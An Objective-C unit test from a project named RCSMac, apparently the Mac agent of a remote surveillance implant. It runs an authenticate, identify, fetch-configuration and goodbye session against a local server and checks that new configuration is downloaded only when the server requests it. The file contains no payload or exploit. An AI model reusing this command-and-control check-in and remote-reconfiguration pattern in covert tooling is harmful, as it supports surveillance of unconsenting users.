//
//  ConfNetworkOperationTest.m
//  RCSMac
//
//  Created by revenge on 1/25/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import <GHUnit/GHUnit.h>

#import "RCSMCommon.h"
#import "RESTTransport.h"
#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ByeNetworkOperation.h"
#import "ConfNetworkOperation.h"


static NSURL *mURL                  = nil;
static RESTTransport *mTransport    = nil;
static AuthNetworkOperation *mAuth  = nil;
static IDNetworkOperation *mID      = nil;
static ConfNetworkOperation *mConf  = nil;
static ByeNetworkOperation *mBye    = nil;

@interface ConfNetworkOperationTest : GHTestCase

@end

@implementation ConfNetworkOperationTest

- (BOOL)shouldRunOnMainThread
{
  // By default NO, but if you have a UI test or test dependent on running on the main thread return YES
  return NO;
}

- (void)setUpClass
{
  // Run at start of all tests in the class
  mURL = [[NSURL alloc] initWithString: @"http://192.168.1.153:8080/"];
}

- (void)tearDownClass
{
  // Run at end of all tests in the class
  [mURL release];
}

- (void)setUp
{
  // Run before each test method
  mTransport = [[RESTTransport alloc] initWithURL: mURL
                                           onPort: 8080];
  
  mAuth  = [[AuthNetworkOperation alloc]
            initWithTransport: mTransport];
  mID    = [[IDNetworkOperation alloc]
            initWithTransport: mTransport];
  mConf  = [[ConfNetworkOperation alloc]
            initWithTransport: mTransport];
  mBye   = [[ByeNetworkOperation alloc]
            initWithTransport: mTransport];
}

- (void)tearDown
{
  // Run after each test method
  [mAuth release];
  [mID release];
  [mConf release];
  [mBye release];
  [mTransport release];
}

- (void)testAllocation
{
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 80];
  
  ConfNetworkOperation *confOP = [[ConfNetworkOperation alloc]
                                  initWithTransport: transport];
  
  GHAssertNotNULL(confOP, nil, @"Error on allocation");
  
  [transport release];
  [confOP release];
}

- (void)testPerform
{
  BOOL result = NO;
  
  result = [mAuth perform];
  GHAssertTrue(result, @"Auth went wrong");
  
  result = [mID perform];
  GHAssertTrue(result, @"idOP went wrong");
  
  NSMutableArray *commandList = [mID getCommands];
  GHTestLog(@"commandList: %@", commandList);
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      if ([[commandList objectAtIndex: i] unsignedIntValue] == PROTO_NEW_CONF)
        {
          GHTestLog(@"Server requested to send a new configuration");
          
          gConfigurationName        = @"actual.conf";
          gConfigurationUpdateName  = @"update.conf";
          
          result = [mConf perform];
          GHAssertTrue(result, @"confOP went wrong");
          
          i = 1337;
          break;
        }
    }
  
  GHAssertEquals(i, 1337, @"No request from server for PROTO_CONF");
  
  result = [mBye perform];
  GHAssertTrue(result, @"Bye went wrong");
}

- (void)testWithNoRequestFromServer
{
  BOOL result = NO;
  
  result = [mAuth perform];
  GHAssertTrue(result, @"Auth went wrong");
  
  result = [mID perform];
  GHAssertTrue(result, @"idOP went wrong");
  
  NSMutableArray *commandList = [mID getCommands];
  GHTestLog(@"commandList: %@", commandList);
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      if ([[commandList objectAtIndex: i] unsignedIntValue] == PROTO_NEW_CONF)
        {
          i = 1337;
          break;
        }
    }
  
  GHAssertNotEquals(i, 1337, @"Server requested PROTO_CONF, can't continue");
  
  result = [mConf perform];
  GHAssertFalse(result, @"confOP should have returned FALSE");
  
  result = [mBye perform];
  GHAssertTrue(result, @"Bye went wrong");
}

@end